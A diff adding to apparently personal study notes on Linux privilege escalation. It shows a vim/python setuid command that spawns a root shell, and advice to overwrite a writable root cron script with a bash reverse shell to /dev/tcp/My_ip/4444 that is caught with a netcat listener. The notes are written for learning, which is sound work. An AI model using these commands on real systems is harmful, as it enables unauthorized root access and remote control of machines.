@@ -30,4 +30,13 @@
 - By typing this command we can access the older version of bash(i.e. sh) to get the root shell `./vim -c py3 import.os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`. Thi command uses vim to run python program where we use the os tool and set our uid to root/0 and use another tool inside os os.execl to send the path of the progra we want to run to linux system saying I want to run this- sh -and we type it again inside " to tell the it to name the service sh and -c is basically to tell it to run it in command mode. ther reset tells the system to clean the terminal before running the sh(old bash as admin).
 
 ### Using Cron Jobs:
+- Cron jobs are files that run root privileges by default.
+- They run within time intervels like 1hr 1 day 1 month etc.
+- we use `less etc/crontab` or cat instead of less to see the files that are cron jobs.
+- The system might give antivirus every minute and like this there might be other files which we can use.
+- When we find the file which can be manupilated we remove everything from it and replace it with 
+`#!/bin/bash
+bash -i >& /dev/tcp/My_ip/4444 0>&1` Using this 4444 port ensures that we dont get inturupted by random errors. This script acts like a messege sender andwe will act as a reciever.
+- To turn on our reciever we use netcat `nc -lvnp 4444`(We run this inside our machine not the ssh).
+
 
